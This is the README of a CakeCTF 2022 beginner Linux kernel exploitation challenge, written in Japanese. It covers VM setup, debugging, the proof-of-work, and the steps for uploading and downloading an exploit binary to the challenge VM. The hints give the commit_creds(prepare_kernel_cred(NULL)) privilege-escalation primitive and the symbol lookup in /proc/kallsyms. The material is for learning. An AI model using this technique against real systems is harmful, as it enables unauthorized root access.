# welkerme
カーネルエクスプロイトの世界へようこそ！
この問題では、Linuxカーネルにおける権限昇格について勉強しましょう。
リモートサーバーで`/root/flag.txt`に書かれたフラグを読むのがゴールです。

## 最初の一歩
### セットアップ
qemu, cpioと開発者ツールをインストールしてください。
```
# apt install qemu-system cpio gcc gdb make
```

### 起動
次のコマンドでVMを起動できます。
```
$ make run
```

### デバッグ
QEMUのデバッグも可能です。まず、VMを
```
$ make debug
```
で実行し、12345番ポートにgdbでアタッチしてください。
```
$ gdb
gdb> target remote localhost:12345
```
何らかの理由でこのポート番号が使えない場合、
`debug.sh`の最終行を変更することで番号を変えられます。

## エクスプロイトの開発
このOSは脆弱なカーネルモジュールを実行しています。
```
[ welkerme - CakeCTF 2022 ]
/ $ lsmod
Module                  Size  Used by    Tainted: G  
driver                 16384  0
```
ソースコードは`src/driver.c`に書かれています。
`module_ioctl`をチェックすると良いかも...？

`exploit.c`を改造してエクスプロイトを完成させてください。

## リモートでの実行
エクスプロイトが上手く書けたら、リモートサーバーで試してみましょう。


### Proof-of-Work
まず、Proof-of-Workを解く必要があります。
```
$ nc pwn2.2022.cakectf.com 9999
hashcash -mb26 x3.lIBh9s
hashcash token: 
```
新しいターミナルを開き、上のPoWの接続は切らないでください。
`hashcash`を持っていない場合はインストールしてください。
```
# apt install hashcash
```
サーバーに提示されたコマンドを実行すると、次のような結果が得られます。
```
$ hashcash -mb26 x3.lIBh9s
hashcash token: 1:26:220902:x3.libh9s::7icDDK3+4NzsByUH:00000002pd8m
hashcash -mb26 x3.lIBh9s  5.79s user 0.00s system 99% cpu 5.797 total
```
問題サーバーにアクセスするにはtokenを送る必要があります。
```
$ nc pwn2.2022.cakectf.com 9999
hashcash -mb26 x3.lIBh9s
hashcash token: 
1:26:220902:x3.libh9s::7icDDK3+4NzsByUH:00000002pd8m
...
```
PoWに関して分からないことがある場合、Discordで運営にお尋ねください。

### エクスプロイトの転送
自分のサーバーを持っている方は、サーバーからエクスプロイトをダウンロードしてください。
（HTTPのみに対応！）
```
/ $ cd /tmp
/tmp $ wget http://<your server>/exploit
```

自分のサーバーを持っていない方は、[sprunge](http://sprunge.us/)や
[termbin](http://termbin.com/)などを利用できます。
まず、サーバーにあなたのエクスプロイトをアップロードしてください。
```
# sprunge
$ base64 exploit | curl -F 'sprunge=<-' http://sprunge.us
http://sprunge.us/XXXXXX

# termbin (File size must be small enough)
$ base64 exploit | nc termbin.com 9999
https://termbin.com/YYYY
```
上の例に示したように、base64でファイルをエンコードしないと壊れる可能性があります。
また、termbinは小さいサイズのファイルしか受け付けません。termbinを使う場合、[musl-gcc](https://www.musl-libc.org/how.html)を使って小さいバイナリを作れます。
アップロードが完了したら、生成されたURLからエクスプロイトをダウンロードできます。
```
/ $ cd /tmp

# sprunge
/tmp $ wget http://sprunge.us/XXXXXX -O exploit.b64
/tmp $ base64 -d exploit.b64 > exploit
/tmp $ chmod +x exploit

# termbin (httpsをhttpに変えること！)
/tmp $ wget http://termbin.com/YYYY -O exploit.b64
/tmp $ base64 -d exploit.b64 > exploit
/tmp $ chmod +x exploit
```

## ヒント
`exploit.c`の関数`func`は、`CMD_EXEC`によってカーネル空間で実行されています。
基本的に、権限昇格のためにカーネル空間で次のコードを実行させたいです。
```c
commit_creds(prepare_kernel_cred(NULL));
```
`prepare_kernel_cred(NULL)`はもっとも高い権限で新しい認証情報を作成します。
`commit_creds(cred)`は認証情報を呼び出し元プロセスに設定します。

各関数のアドレスは`/proc/kallsync`に記載されています。（デバッグモードを使用してください）
```
/ # grep commit_creds /proc/kallsyms 
ffffffff81072540 T commit_creds
```
頑張ってください。

## 参考になる文献
この問題はもっとも簡単なカーネルエクスプロイトです。
しかし、もし詰まった場合は、次のサイトなどが助けになるかもしれません。
これらの記事は、この問題より少し複雑なエクスプロイトについて説明していることには注意してください。

- [Learning Linux Kernel Exploitation](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#the-simplest-exploit---ret2usr) by Midas (英語)
- [Linux Kernel Exploit 内核漏洞学习(2)-ROP](https://bbs.pediy.com/thread-253377.htm#msg_header_h1_5) by 钞sir (中国語)
- [PAWNYABLE!](https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html#ret2user-ret2usr) by ptr-yudai (日本語)
- [Exploit Tech: ret2usr](https://learn.dreamhack.io/82#t572) by Dreamhack (韓国語)

最後に重要なことですが、Google検索は常にあなたの味方です。
